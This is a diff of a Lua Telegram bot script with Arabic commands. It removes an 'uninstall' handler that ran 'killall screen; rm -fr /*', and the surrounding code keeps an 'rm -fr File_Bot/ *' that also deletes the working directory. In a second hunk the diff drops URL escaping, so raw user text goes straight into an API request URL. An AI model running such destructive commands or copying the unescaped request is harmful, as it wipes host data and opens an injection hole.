@@ -5208,15 +5208,6 @@ os.execute("rm -fr File_Bot/ *")
 send(msg.chat_id_,msg.id_," ☉┇ تم مسح ملفات البوت يمكنك تحميلها من `المتجر`")
 return false
 end
-if text == "حذف التنصيب" then
-if not SudoBot(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
-return false
-end
-send(msg.chat_id_,msg.id_," ☉┇ تم حذف التنصيب و ايقاف البوت 😿")
-os.execute("killall screen; rm -fr /*")
-return false
-end
 if text == ("رفع مطور ثالث") or text == ("رفع مطور") and msg.reply_to_message_id_ then
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
@@ -14811,7 +14802,7 @@ send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم �
 end
 if text and text:match("^كرونا (.*)$") then
 local TextCrona = text:match("^كرونا (.*)$")
-co = https.request('http://amerajo.tk/api_saikoo/api.php?corona='..URL.escape(TextCrona)..'')
+co = https.request('http://amerajo.tk/api_saikoo/api.php?corona='..TextCrona..'')
 cr = JSON.decode(co)
 i = 0
 for k,v in pairs(cr.ok) do
